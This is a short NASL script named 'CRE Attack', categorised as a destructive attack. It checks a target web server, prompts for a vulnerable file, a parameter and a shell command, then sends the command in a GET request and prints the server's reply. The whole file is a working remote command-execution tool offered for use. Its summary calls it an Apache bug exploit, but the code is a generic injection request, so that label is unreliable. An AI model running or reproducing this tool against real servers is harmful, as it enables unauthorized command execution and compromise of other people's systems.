
if(description)	{
	script_name(english:"CRE Attack");
	script_summary(english:"exploiting a bug in apache to executing code remotely");
	script_category(ACT_DESTRUCTIVE_ATTACK);
	script_copyright(english:"This script was written by Riccardo Melioli");
	exit(0);
}
# Include HTTP functions
include("http_func.inc");

# Get target IP address
ipAddress = get_host_ip();
display("Target IP address: " + ipAddress + '\n');
# Get web server port
port = get_http_port(default:80);
display("Server port: " + port + '\n');
# Check if server is active
if(get_port_state(port)) {
	soc = http_open_socket(port);
	if(soc) {
		display("Server active\n");
		http_close_socket(soc);
	}else{
		display("Server down/Cannot open socket\n");
		exit(0);
	}
}

file = prompt("Vulnerable file path (e.g. /folder/file.php): ");
if(!file || file == "") {
	display("Invalid file path\n");
	exit(0);
}

param = prompt("Parameter name: ");
if(!param || param == "") {
	display("Invalid parameter name\n");
	exit(0);
}

cmd = prompt("Command to execute: ");
if(!cmd || cmd == "") {
	display("Invalid command\n");
	exit(0);
}

cmd = str_replace(string: cmd, find: " ", replace: "%20");
# Build final request string
finalString = strcat(file, "?", param, "=", cmd);

if(get_port_state(port)) {
	soc = http_open_socket(port);
	if(soc) {
		# Create GET request
		request = http_get(port: port, item: finalString);
		# Send request to open socket
		send(socket:soc, data: request);
		# Display response
		resp = http_recv(socket: soc);
		display(resp);
		
		http_close_socket(soc);
	}else{
		display("Cannot open socket\n");
		exit(0);
	}
}

